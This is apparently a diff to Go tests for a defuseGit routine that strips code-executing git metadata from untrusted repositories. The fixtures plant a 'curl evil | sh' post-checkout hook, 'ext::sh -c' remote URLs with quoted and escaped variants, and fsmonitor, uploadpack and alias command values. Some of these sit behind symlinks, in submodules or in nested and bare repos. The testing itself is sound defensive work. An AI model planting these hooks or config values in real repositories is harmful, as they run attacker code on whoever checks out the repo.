@@ -17,10 +17,18 @@ func write(t *testing.T, path, body string) {
 	}
 }
 
+// repo makes the bones git recognises as a repository directory.
+func repo(t *testing.T, g string) {
+	t.Helper()
+	write(t, filepath.Join(g, "HEAD"), "ref: refs/heads/main\n")
+	write(t, filepath.Join(g, "objects", "info", "packs"), "")
+	write(t, filepath.Join(g, "refs", "heads", "main"), "0000000000000000000000000000000000000000\n")
+}
+
 func TestDefuseGitKeepsHistoryAndDropsWhatRuns(t *testing.T) {
 	dest := t.TempDir()
 	g := filepath.Join(dest, ".git")
-	write(t, filepath.Join(g, "HEAD"), "ref: refs/heads/main\n")
+	repo(t, g)
 	write(t, filepath.Join(g, "hooks", "post-checkout"), "#!/bin/sh\ncurl evil | sh\n")
 	write(t, filepath.Join(g, "config"), `[core]
 	repositoryformatversion = 0
@@ -42,6 +50,11 @@ func TestDefuseGitKeepsHistoryAndDropsWhatRuns(t *testing.T) {
 	uploadpack = sh -c pwn
 [remote "evil"]
 	url = ext::sh -c pwn
+[remote "quoted"]
+	url = "ext::sh -c pwn"
+[remote "escaped"]
+	url = ex\
+t::sh
 [branch "main"]
 	remote = origin
 	merge = refs/heads/main
@@ -50,6 +63,7 @@ func TestDefuseGitKeepsHistoryAndDropsWhatRuns(t *testing.T) {
 [alias]
 	st = !pwn
 `)
+	repo(t, filepath.Join(g, "modules", "lib"))
 	write(t, filepath.Join(g, "modules", "lib", "hooks", "pre-commit"), "pwn")
 	write(t, filepath.Join(g, "modules", "lib", "config"), "[core]\n\tfsmonitor = pwn\n")
 	write(t, filepath.Join(g, "config.worktree"), "[core]\n\tfsmonitor = pwn\n")
@@ -92,5 +106,50 @@ func TestDefuseGitRemovesAGitFile(t *testing.T) {
 	}
 	if _, err := os.Lstat(filepath.Join(dest, ".git")); !os.IsNotExist(err) {
 		t.Error(".git file survived")
+	}
+}
+
+func TestDefuseGitCatchesLinksNestedAndBareRepos(t *testing.T) {
+	dest := t.TempDir()
+	g := filepath.Join(dest, ".git")
+	repo(t, g)
+	write(t, filepath.Join(g, "config"), "[core]\n\tbare = false\n")
+	// hooks as a link to scripts in the working tree
+	write(t, filepath.Join(dest, "scripts", "post-checkout"), "pwn")
+	if err := os.Symlink("../scripts", filepath.Join(g, "hooks")); err != nil {
+		t.Fatal(err)
+	}
+	// a submodule whose name is "objects"
+	repo(t, filepath.Join(g, "modules", "objects"))
+	write(t, filepath.Join(g, "modules", "objects", "hooks", "pre-commit"), "pwn")
+	write(t, filepath.Join(g, "modules", "objects", "config"), "[core]\n\tfsmonitor = pwn\n")
+	// a repository nested in the working tree, and a bare one
+	repo(t, filepath.Join(dest, "vendor", "lib", ".git"))
+	write(t, filepath.Join(dest, "vendor", "lib", ".git", "hooks", "pre-commit"), "pwn")
+	write(t, filepath.Join(dest, "vendor", "lib", ".git", "config"), "[core]\n\tfsmonitor = pwn\n")
+	repo(t, filepath.Join(dest, "fixtures", "bare.git"))
+	write(t, filepath.Join(dest, "fixtures", "bare.git", "config"), "[core]\n\tbare = true\n\tfsmonitor = pwn\n")
+	// a gitfile in a subfolder
+	write(t, filepath.Join(dest, "sub", ".git"), "gitdir: /elsewhere\n")
+
+	if err := defuseGit(dest); err != nil {
+		t.Fatal(err)
+	}
+	if fi, err := os.Lstat(filepath.Join(g, "hooks")); err != nil || !fi.IsDir() {
+		t.Errorf("hooks should be a real empty directory: %v %v", fi, err)
+	}
+	if _, err := os.Stat(filepath.Join(dest, "scripts", "post-checkout")); err != nil {
+		t.Error("the working tree file a link pointed at should be left alone")
+	}
+	for _, gone := range []string{".git/modules/objects/hooks/pre-commit", "vendor/lib/.git/hooks/pre-commit", "sub/.git"} {
+		if _, err := os.Lstat(filepath.Join(dest, gone)); !os.IsNotExist(err) {
+			t.Errorf("%s survived", gone)
+		}
+	}
+	for _, cfg := range []string{".git/modules/objects/config", "vendor/lib/.git/config", "fixtures/bare.git/config"} {
+		b, _ := os.ReadFile(filepath.Join(dest, cfg))
+		if strings.Contains(string(b), "fsmonitor") {
+			t.Errorf("%s kept fsmonitor: %s", cfg, b)
+		}
 	}
 }
